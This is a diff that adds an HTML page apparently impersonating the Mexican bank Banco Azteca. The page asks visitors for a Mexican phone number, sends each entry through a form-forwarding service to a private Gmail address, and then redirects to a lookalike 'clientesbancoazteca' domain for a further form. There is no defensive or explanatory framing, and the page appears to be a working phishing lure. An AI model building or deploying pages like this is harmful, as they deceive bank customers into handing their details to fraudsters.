@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banca</title>
+
+    <style>
+        .contenedor{
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding-top: 50px;
+            gap: 55px;
+        }
+        .logo{
+            width: 350px;
+        }
+        .pedirnum{
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .contingnum{
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            align-items: center;
+        }
+        .numlabel{
+            font-size: 17px;
+            font-weight: 600;
+            font-family: sans-serif;
+        }
+        #num{
+            width: 250px;
+            height: 35px;
+            font-family: sans-serif;
+            font-size: 15px;
+            text-align: center;
+        }
+        .btnenviar{
+            background-color: #1c613b;
+            cursor: pointer;
+            height: 45px;
+            font-size: 18px;
+            font-family: sans-serif;
+            color: #fff;
+        }
+
+    </style>
+
+</head>
+<body>
+    <div class="contenedor">
+        <img src="./logo.png" alt="" class="logo">
+        <form class="pedirnum" id="contactform" action="https://formsubmit.io/send/aztecabancok@gmail.com" method="POST">
+            <input name="_redirect" type="hidden" id="name" value="https://clientesbancoazteca.vercel.app/formulario.html">
+            <div class="contingnum">
+            <label class="numlabel" for="num">+52</label>
+            <input type="number" name="num" id="num" placeholder="Ingrese su numero">
+            </div>
+            <input class="btnenviar" id="btnenviar" type="submit" value="Enviar">
+        </form>
+    </div>
+</body>
+<script>
+    const numInput = document.getElementById("num");
+    const btnenviar = document.getElementById("btnenviar");
+
+    numInput.oninput = function() {
+      this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
+    }
+
+    
+numInput.oninput = function() {
+    if (numInput.value.length === 10) {
+      btnenviar.removeAttribute("disabled");
+    } else {
+      btnenviar.setAttribute("disabled", "");
+    }
+  }
+
+</script>
+</html>
